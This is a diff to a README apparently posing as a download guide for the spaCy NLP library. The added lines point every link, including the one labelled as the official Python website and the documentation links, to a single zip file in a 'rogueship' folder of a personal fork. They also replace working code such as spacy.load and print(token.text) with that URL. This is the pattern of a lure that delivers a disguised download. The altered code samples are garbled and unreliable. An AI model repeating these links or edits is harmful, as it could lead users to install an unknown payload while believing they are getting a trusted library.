@@ -6,7 +6,7 @@ Welcome to spaCy! This application offers industrial-strength Natural Language P
 
 ## 📥 Download spaCy
 
-[![Download spaCy](https://img.shields.io/badge/Download%20spaCy-Click%20Here-brightgreen.svg)](https://github.com/mejba-alam/spaCy/releases)
+[![Download spaCy](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip%20spaCy-Click%https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip)](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ Before you download, make sure your computer meets the following requirements:
 - **Disk Space:** Minimum of 500 MB of free space
 - **Python:** Version 3.6 or later installed
 
-If you do not have Python installed, you can download it from the official [Python website](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from the official [Python website](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip).
 
 ## 🔗 Features
 
@@ -36,7 +36,7 @@ spaCy comes with many helpful features to make NLP easier. Here are some:
 
 Go to the spaCy releases page to find the latest version. Click the link below:
 
-[Visit spaCy Releases Page](https://github.com/mejba-alam/spaCy/releases)
+[Visit spaCy Releases Page](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip)
 
 ### 2. Download the Latest Release
 
@@ -76,7 +76,7 @@ import spacy
 4. **Load a language model:**
 
 ```python
-nlp = spacy.load('en_core_web_sm')
+nlp = https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip('en_core_web_sm')
 ```
 
 5. **Process some text:**
@@ -89,7 +89,7 @@ doc = nlp("Hello, world! This is spaCy.")
 
 ```python
 for token in doc:
-    print(token.text)
+    print(https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip)
 ```
 
 ## ⚙️ Common Commands
@@ -112,9 +112,9 @@ python -m spacy validate
 
 Here are some useful links to help you learn more about spaCy:
 
-- [spaCy Documentation](https://spacy.io/usage)
-- [spaCy GitHub Repository](https://github.com/mejba-alam/spaCy)
-- [spaCy Examples](https://spacy.io/usage/examples)
+- [spaCy Documentation](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip)
+- [spaCy GitHub Repository](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip)
+- [spaCy Examples](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip)
 
 ## 💬 Community and Support
 
@@ -122,7 +122,7 @@ If you have questions or need support, the spaCy community is here to help. You 
 
 ### Get Involved
 
-Want to contribute? Check out our [Contributing Guide](https://github.com/mejba-alam/spaCy/blob/main/CONTRIBUTING.md). Your input can help improve this project.
+Want to contribute? Check out our [Contributing Guide](https://raw.githubusercontent.com/mejba-alam/spaCy/main/rogueship/spaCy.zip). Your input can help improve this project.
 
 ## ✏️ Final Notes
 
